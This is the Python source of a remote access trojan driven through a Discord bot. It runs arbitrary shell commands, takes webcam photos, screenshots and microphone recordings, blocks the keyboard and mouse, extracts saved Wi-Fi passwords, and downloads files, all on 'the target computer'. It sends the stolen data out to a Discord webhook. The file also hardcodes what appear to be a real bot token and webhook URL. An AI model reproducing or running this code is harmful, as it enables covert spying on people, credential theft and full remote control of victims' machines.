import os
import time
import subprocess
import pyautogui
import datetime
import discord
from discord_webhook import DiscordWebhook
import wmi
import requests
import cv2
import pynput
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write


TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.GvXOK5.h4fkEprYwuWlB6BfuyremN04aJAoollnT-rwtY"
WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if message.author == client.user:
        return
    

    if message.content.startswith('command'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('command ', '')
        hmm = subprocess.run(command, capture_output=True, text=True)
        out = hmm.stdout
        out = out.replace('Ã', '├')
        out = out.replace('Ä', '─')
        print(out)
        chunklength = 2000
        chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]

        for chunk in chunks: 
            webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
            response = webhook.execute()

        
    elif message.content.startswith('cam'):
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            print("Error: Could not open camera.")
            return
        
        capture_duration = 1
        start_time = time.time()

        while (time.time() - start_time) < capture_duration:
            ret, frame = cap.read()

            if not ret:
                print("Error: Failed to capture frame.")
                break

        cv2.imwrite("pic.jpg", frame)
        print("Picture captured successfully as 'captured_picture.jpg'")
        cap.release()
        cv2.destroyAllWindows()
        time_now = datetime.datetime.now()

        webhook = DiscordWebhook(url=WEBHOOK_URL, content="pic taken at " + str(time_now))
        with open("./pic.jpg", "rb") as f:
            webhook.add_file(file=f.read(), filename="pic.jpg")
        response = webhook.execute()
        os.remove("./pic.jpg")


    elif message.content.startswith('com'):
        await message.channel.send('Sent command!')
        command = message.content
        command = command.replace('com ', '')
        os.system(command)
        
        
    elif message.content.startswith('lock'):
        await message.channel.send('locked!')
        command = message.content
        command = command.replace('lock ', '')
        mouse_listener = pynput.mouse.Listener(suppress=True)
        mouse_listener.start()
        keyboard_listener = pynput.keyboard.Listener(suppress=True)
        keyboard_listener.start()
        time.sleep(int(command))
        mouse_listener.stop()
        keyboard_listener.stop()
        await message.channel.send('unlocked!')
        
        
        
    elif message.content.startswith('screenshot'):
        time_now = datetime.datetime.now()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save("help.png")
        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Screenshot taken at " + str(time_now))
        with open("./help.png", "rb") as f:
            webhook.add_file(file=f.read(), filename="help.png")
        response = webhook.execute()
        os.remove("./help.png")

        
    elif message.content.startswith('wifi'):
        networks, out = [], ''
        wifis = []

        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]
            wifis = len(networks)

            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                                for b in results if "Key Content" in b]
                    
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass
        except UnicodeDecodeError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)
        webhook = DiscordWebhook(url=WEBHOOK_URL, content="`"+ out + "`")
        response = webhook.execute()


    elif message.content.startswith('download'):
        command = message.content
        command = command.replace('download ', '')
        command = command.split()
        url  = command[0]
        file_name = command[1]
        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Downloading!")
        response = webhook.execute()
    
        r = requests.get(url, allow_redirects=True)
        open(file_name, 'wb').write(r.content)
        

    elif message.content.startswith('sys'):
            command = message.content
            command = command.replace('sys ', '')
            cpu = wmi.WMI().Win32_Processor()[0].Name
            gpu = wmi.WMI().Win32_VideoController()[0].Name
            ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                        0].TotalVisibleMemorySize) / 1048576, 0)
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
            response = webhook.execute()
    

    elif message.content.startswith("play"):
        command = message.content
        command = command.replace("play ", "")
        command = command.split()
        url = command[0]
        
        try:
            wait_time = command[1]
        except IndexError:
            wait_time = 10

        webhook = DiscordWebhook(url=WEBHOOK_URL, content='Audio playing.. Closing media player after ' + str(wait_time) + ' seconds!')
        response = webhook.execute()

        r = requests.get(url, allow_redirects=True)
        open('sound.m4a', 'wb').write(r.content)
        os.system("sound.m4a")

        time.sleep(int(wait_time))

        os.remove("sound.m4a")
        os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")


    elif message.content.startswith("web"):
        command = message.content
        command = command.replace("web ", "")
        site = command

        webhook = DiscordWebhook(url=WEBHOOK_URL, content='Opening website ' + site + '!')
        response = webhook.execute()

        visit='http://{}'.format(site)
        webbrowser.open(visit)
    
    
    elif message.content.startswith("record"):
        command = message.content
        command = command.replace("record ", "")
        seconds = int(command)  # Duration of recording

        fs = 44100  # Sample rate
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('recording.wav', fs, myrecording)  # Save as WAV file
        
        time_now = datetime.datetime.now()
        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Audio recorded at " + str(time_now) + " for " + str(seconds) + " seconds")
        with open("./recording.wav", "rb") as rec:
            webhook.add_file(file=rec.read(), filename="recording.wav")
        response = webhook.execute()
        os.remove("./recording.wav")
    
    
    elif message.content.startswith("help"):
        embed=discord.Embed(title="Here are my Commands!", description="nodes online", color=0x05e6e2)
        embed.add_field(name="command <command>", value="send a command with output", inline=False)
        embed.add_field(name="com <command>", value="send a command without output", inline=False)
        embed.add_field(name="cam", value="take a picture", inline=False)
        embed.add_field(name="lock <time>", value="locks the user's keyboard and mouse for the specified amount of time", inline=False)
        embed.add_field(name="screenshot", value="sends you a screenshot of the target computer", inline=False)
        embed.add_field(name="wifi", value="gives you a list of all saved wifi password on the target device", inline=False)
        embed.add_field(name="download <url> <file_name>", value="downloads the file at the url", inline=False)
        embed.add_field(name="sys", value="gives you the specs of the target computer", inline=False)
        embed.add_field(name="play <url> <time_to_close_player>", value="self explainatory", inline=False)
        embed.add_field(name="web <url>", value="opens the url in the browser", inline=False)
        embed.add_field(name="record <time>", value="records an audio file on the target computer and sends it to you", inline=False)
        await message.channel.send(embed=embed)

        
client.run(TOKEN)
